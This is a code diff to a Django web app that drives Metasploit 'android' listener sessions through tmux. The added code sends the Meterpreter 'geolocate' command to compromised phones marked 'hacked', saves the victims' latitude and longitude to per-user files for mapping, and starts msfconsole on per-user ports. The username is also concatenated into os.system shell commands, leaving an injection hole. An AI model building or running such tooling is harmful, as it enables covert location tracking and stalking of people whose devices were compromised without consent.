@@ -12,7 +12,7 @@ import subprocess
 import gmplot
 from django.http import JsonResponse
 from django.contrib.auth.decorators import login_required
-
+from pathlib import Path
 
 
 ###################                  metasploit
@@ -63,18 +63,48 @@ def listen(request):
         last = fh.readlines()[-1].decode()
     with open('hacked.txt', 'rb') as fh:
         hacked = fh.readlines()[-1].decode()
+    with open(dirr+'file.txt', 'rb') as fh:
+        lat = fh.readlines()[-3].decode()
+    with open(dirr+'file.txt', 'rb') as fh:
+        long = fh.readlines()[-2].decode()
     if hacked == last :
         color = "green"
+        os.system('tmux send-keys -t '+str(username)+' "geolocate""\n"')
+        with open(dirr+'file.txt', 'rb') as fh:
+            lat = fh.readlines()[-3].decode()
+        with open(dirr+'file.txt', 'rb') as fh:
+            long = fh.readlines()[-2].decode()
+        f=open(dirr+"lat.txt", "a+")
+        f.write(lat)
+        f.close()
+        l=open(dirr+"long.txt", "a+")
+        l.write(long)
+        l.close()
     else:
         color = "gray"
+        lat=0
+        long =0
     return render(
         request,
         'metasploit/android/listen.html',
-        context={'last' : last,'hacked' : hacked,'color' : color,
+        context={'last' : last,'hacked' : hacked,'color' : color,'lat':lat,'long':long,
         }
     )
 def startlisten(request):
     username = request.user.username
+
+    my_file = Path('/root/django/users/'+ str(username)+'/lat.txt')
+    if my_file.is_file():
+        pass
+    else:
+        d=os.system('touch /root/django/users/'+ str(username)+'/lat.txt')
+
+    my_file = Path('/root/django/users/'+ str(username)+'/long.txt')
+    if my_file.is_file():
+        pass
+    else:
+        d=os.system('touch /root/django/users/'+ str(username)+'/long.txt')
+
     dir = '/root/django/users/'+ str(username)+'/'+str(username)
     port=4444+int(request.user.id)
     os.system('tmux send-keys -t '+str(username)+' "msfconsole""\n"')
